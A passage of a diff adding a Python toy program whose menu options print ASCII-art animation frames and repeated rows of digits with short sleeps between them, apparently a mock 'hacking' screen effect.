+                           |        \___                          |
+                           |            |                         |
+                            |•|----|•|--                          |
+                                                                                                                                                                                                                 
+                                                                                 """)
+
+           time.sleep(0.5)
+           print("""
+                                                                                                                                                                                                                                                                                                         
+                                          _________           
+                                          |        \___           |
+                                          |            |          |
+                                           |•|----|•|--           |
+                                                                                                                                                                                                                                                                          
+                                                                                            """)
+           time.sleep(0.5)
+           print("""
+                                                                                                                                                                                                                                                                                                                                                                                             
+                                                     _________           
+                                                     |        \___ |
+                                                     |            ||
+                                                     |•|----|•|--  |
+                                                                                                                                                                                                                                                                                                                                                             
+                                                                                                                    """)
+           time.sleep(0.5)
+           print("""
+                                                                                 ]                                                                                                                                                                                                                                                                                                                                                                                                                     
+                                                                         _________[]  =-=[]  ]       
+                                                                         |       []] ][\__[=[||
+                                                                         |      =][]  ]  [][]]  /|
+                                                                         |•|----|][•|-- \|-
+                                                                                     ]                                                                                                                                                                                                                                                                                                                                                                                 
+                                                                                  """)
+           time.sleep(0.7)
+        elif choice == '14':
+          time.sleep(0.3)
+          print("""
+          
+          
+          
+          0
+       000000000000000000
+    000000000000000000000
+0000000000000000000000000
+   0000000000000000000000
+     0 0 0000000000000000
+          0
+          
+          
+                                           """)
+          time.sleep(0.3)
+          print("""
+          
+          
+          
+         0
+    000000000000000000
+ 000000000000000000000
+00000000000000000000000
+0000000000000000000000
+   0 0 0000000000000000
+       0
+          
+          
+                                           """)
+          time.sleep(0.3)
+          print("""
+          
+          
+          
+         0
+    000000000000000000
+ 000000000000000000000
+00000000000000000000000
+0000000000000000000000
+   0 0 0000000000000000
+1      0
+          
+          
+                                           """)
+          time.sleep(0.3)
+          print("""
+          
+          
+          
+         0
+    000000000000000000
+ 000000000000000000000
+00000000000000000000000
+0000000000000000000000
+   0 0 0000000000000000
+1      0
+1         
+          
+                                           """)
+          time.sleep(0.3)
+          print("""
+          
+          
+          
+         0
+    000000000000000000
+ 000000000000000000000
+00000000000000000000000
+0000000000000000000000
+   0 0 0000000000000000
+1      0
+1         
+1ooooooooo         
+                                           """)
+          time.sleep(0.3)
+          print("""
+          
+          
+          
+         0
+    000000000000000000
+ 000000000000000000000
+00000000000000000000000
+0000000000000000000000
+   0 0 0000000000000000
+1      0
+1         
+1oooooooooooooooooo...................         
+                                           """)
+        elif choice == '15':
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
